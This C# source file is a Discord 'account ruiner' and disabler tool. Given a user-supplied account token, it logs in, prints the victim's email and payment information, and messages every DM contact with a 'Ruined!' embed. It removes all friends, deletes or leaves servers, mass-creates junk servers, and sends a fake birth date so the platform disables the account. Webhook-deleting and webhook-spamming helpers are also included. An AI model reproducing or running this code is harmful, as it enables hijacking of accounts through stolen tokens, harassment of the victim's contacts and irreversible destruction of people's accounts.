using Crayon;
using Discord;
using Discord.Gateway;
using Leaf.xNet;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace DiscordShitsHA
{
    class DiscordClass
    {
        //////////////////////////////////WEBHOOKS//////////////////////////////////
        //Based on https://github.com/Fweak/Webhooker
        public static void infosWebhook(){Console.Clear();Program.DisplayMenuOptions("Put a webhook:", 200, "info");string webhook = Console.ReadLine();Process.Start(webhook);}
        public static byte[] Post(dynamic URI, NameValueCollection Value) { using (WebClient WebClient = new WebClient()) return WebClient.UploadValues(URI, Value); }
        public static void sendWebhook(dynamic URL, dynamic Username, dynamic Avatar, dynamic Message){try{Post(URL, new NameValueCollection() { { "username", Username }, { "content", Message }, { "avatar_url", Avatar } });}catch (Exception ex){MessageBox.Show($"Error: \n{ex}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);}}
        public static void editWebhook(dynamic webhook, dynamic name, dynamic avatar){try{using (HttpRequest request = new HttpRequest()){MessageBox.Show("Later because again too lazyyyy", "Informations", MessageBoxButtons.OK, MessageBoxIcon.Information);}}catch (Exception ex){MessageBox.Show($"Error: \n{ex}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);}}
        public static void removeWebhook(dynamic webhook){try{using (HttpRequest request = new HttpRequest()){request.UseCookies = false;request.Delete(webhook).ToString();}}catch (Exception ex){MessageBox.Show($"Error: \n{ex}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);}}
        ///////////////////////////////////////////////
        //////////////////////////////////Tokens//////////////////////////////////

        //Based on https://github.com/JenzV/AccountRuiner
        public static void Ruiner(){Console.Clear();Program.DisplayMenuOptions("Put a token:", 200, "info");string token = Console.ReadLine();DiscordSocketClient client = new DiscordSocketClient();client.OnLoggedIn += LRuiner;try { client.Login(token); Console.Clear(); Thread.Sleep(-1); }catch (Exception) { Console.Clear(); Console.WriteLine("Invalid Token!"); Console.ReadLine(); }}
        private static void LRuiner(DiscordSocketClient client, LoginEventArgs args){int numberofguildsa = client.GetGuilds().Count;Console.WriteLine($"<===========================>\nAccount Informations:\nTag: {client.User.Username}#{client.User.Discriminator} - ({client.User.Id})\nEmail: {client.User.Email} (Verified: {client.User.EmailVerified})\nHypeSquad: {client.User.Hypesquad}\nNumber of Payments Methods: {client.GetPaymentMethods().Count}\nPayments Count: {client.GetPayments(int.Parse("5")).Count}\nNitro: {client.User.Nitro}\nNumber of guilds: {numberofguildsa}\n<===========================>\n");Console.WriteLine("Number of guilds? (Max 100)"); int guilds = int.Parse(Console.ReadLine()); Console.Clear(); Console.WriteLine("Type Enter"); Console.ReadLine();client.SetStatus(Discord.UserStatus.Online); client.SendFriendRequest(ulong.Parse("709585179261272161")); client.User.ChangeSettings(new UserSettings() { Theme = Theme.Light }); client.User.ChangeSettings(new UserSettings() { Language = Language.Russian }); client.User.ChangeSettings(new UserSettings() { DeveloperMode = false }); client.User.ChangeSettings(new UserSettings() { PlayGifsAutomatically = false }); client.User.SetHypesquad(Hypesquad.Brilliance); client.User.ChangeSettings(new UserSettings() { CompactMessages = true }); client.User.ChangeSettings(new UserSettings() { EnableTts = true }); client.User.ChangeSettings(new UserSettings() { ExplicitContentFilter = ExplicitContentFilter.ILiveOnTheEdge });foreach (dynamic dm in client.GetPrivateChannels()){try{dm.TriggerTyping(); EmbedMaker embed = new EmbedMaker { Title = "Ruined!", Description = "Fuck", Color = Color.FromArgb(54, 57, 63), TitleUrl = "https://google.com/", ImageUrl = "https://images8.alphacoders.com/533/thumb-1920-533007.png", ThumbnailUrl = "https://images-ext-2.discordapp.net/external/21hUqyqlH0cUW-IlchfD-Jnghbo0sJfqVrL9uEwLfj4/https/cdn.discordapp.com/avatars/709585179261272161/a_a37f0a3cbc12433e37b35b4a9d0520a4.gif" }; embed.Footer.Text = "Discord: Hideaki#0136!"; embed.Footer.IconUrl = "https://images-ext-2.discordapp.net/external/21hUqyqlH0cUW-IlchfD-Jnghbo0sJfqVrL9uEwLfj4/https/cdn.discordapp.com/avatars/709585179261272161/a_a37f0a3cbc12433e37b35b4a9d0520a4.gif";dm.SendMessage("User ruined!", false, embed);}catch (Exception) { } Console.WriteLine($"[MPs] closed"); dm.Leave(); Thread.Sleep(100); } foreach (dynamic relationship in args.Relationships) { if (relationship.Type == RelationshipType.Friends) { relationship.Remove(); Console.WriteLine("Delete friends..."); } if (relationship.Type == RelationshipType.IncomingRequest) { relationship.Remove(); Console.WriteLine("Delete Incoming friends requests..."); } if (relationship.Type == RelationshipType.OutgoingRequest) { relationship.Remove(); Console.WriteLine("Delete Outgoing friends requests..."); }; if (relationship.Type == RelationshipType.Blocked) { relationship.Remove(); Console.WriteLine("Unblock blocked users..."); }; }foreach (dynamic guild in client.GetGuilds()){try{if (guild.Owner){guild.Delete();Console.WriteLine($"Guild deleted: {guild.Name}");}else{guild.Leave(); Console.WriteLine($"Guild leave: {guild.Name}"); Thread.Sleep(100);}}catch{Console.WriteLine($"Problem with: {guild.Name}");}}WebClient wc = new WebClient();string a = "destroyed";wc.DownloadFile("https://i.imgur.com/d8lgDGj.png", $"{a}.png"); wc.Dispose();for (dynamic i = 1; i <= guilds; i++){client.CreateGuild("Nothing Here", Image.FromFile($"{a}.png"), "russia");Console.WriteLine("Created: {0} guilds...", i);}int numberofguilds = client.GetGuilds().Count;if (numberofguilds <= 98) { using (HttpRequest join = new HttpRequest()) { join.AddHeader("Authorization", client.Token); join.Post("https://discord.com/api/v6/invite/minecraft"); } using (HttpRequest join = new HttpRequest()) { join.AddHeader("Authorization", client.Token); join.Post("https://discord.com/api/v6/invite/tfer7va"); } } else if (numberofguilds <= 99) { using (HttpRequest join = new HttpRequest()) { join.AddHeader("Authorization", client.Token); join.Post("https://discord.com/api/v6/invite/tfer7va"); } }Console.WriteLine("Success!(To do: Adding 'remove guild boost'\r\n(Typer Enter)");Console.ReadLine();Environment.Exit(0);}
        ////////////////////////////////////////////////
        public static void Disabler(){Console.Clear();Program.DisplayMenuOptions("Put a token:", 200, "info");string token = Console.ReadLine();using (HttpRequest request = new HttpRequest()){var json = new StringContent("{\"date_of_birth\":\"2017-1-21\"}") { ContentType = "application/json" };request.AddHeader("Authorization", token);request.Raw(HttpMethod.PATCH, "https://discord.com/api/v6/users/@me", json);string respStr = request.ToString();var lol = int.Parse(request.Response.StatusCode.ToString());if (lol == 403 || lol == 401 || lol == 400){Console.WriteLine(Output.BrightRed($"Error! Invalid or Already disabled!"));Console.ReadKey();} else{Console.WriteLine(Output.BrightBlue($"Disabled with success!"));Console.ReadKey();}}}
    }
}
